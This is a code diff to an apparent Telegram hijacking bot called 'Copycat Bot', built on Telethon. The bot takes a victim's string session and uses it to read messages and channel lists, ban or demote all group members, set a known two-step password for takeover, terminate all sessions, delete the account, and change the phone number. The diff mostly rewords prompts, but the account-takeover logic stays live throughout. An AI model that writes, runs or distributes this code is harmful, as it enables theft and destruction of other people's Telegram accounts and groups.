@@ -74,7 +74,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_2fa('LEGENDXISBEST')
+      await X.edit_2fa('COPYCATISBEST')
       return True
     except:
       return False
@@ -204,17 +204,17 @@ async def start(event):
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("This StringSession is TERMINATED")
       if len(i) > 3855:
         file = open("session.txt", "w")
         file.write(i + "\n\nDETAILS BY COPYCAT")
@@ -224,114 +224,114 @@ async def start(event):
       else:
         await event.reply(i + "\n\nThanks For using Copycat Bot")
     elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       i = await userinfo(strses.text)
       await event.reply(i + "\n\nThanks For using Copycat Bot")
     elif r == "C":
-      await x.send_message("GIVE ME THE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
       await event.reply("Banning all members Thanks For using Copycat Bot")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       i = await usermsgs(strses.text)
       await event.reply(i + "\n\nThanks For using Copycat Bot")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
       await event.reply("Joined the Channel/Group Thanks For using Copycat Bot")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
       await event.reply("Leaved the Channel/Group Thanks For using Copycat Bot")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
       await event.reply("Deleted the Channel/Group Thanks For using Copycat Bot")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       i = await user2fa(strses.text)
       if i:
         await event.reply("User don't have two step thats why now two step is `COPYCATISBEST` you can login now\n\nThanks For using Copycat Bot")
       else:
         await event.reply("Sorry User Have two step already")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       i = await terminate(strses.text)
       await event.reply("The all sessions are terminated\n\nThanks For using Copycat Bot")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       i = await delacc(strses.text)
       await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using Copycat Bot")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       grp = await x.get_response()
       await x.send_message("NOW GIVE USER USERNAME")
@@ -339,13 +339,13 @@ async def start(event):
       i = await promote(strses.text, grp.text, user.text)
       await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using Copycat Bot")
     elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       pro = await x.get_response()
       try:
@@ -354,13 +354,13 @@ async def start(event):
         pass
       await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using Copycat Bot")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE ME THE USER STRING SESSION")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is TERMINATED")
       await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
       number = (await x.get_response()).text
       try:
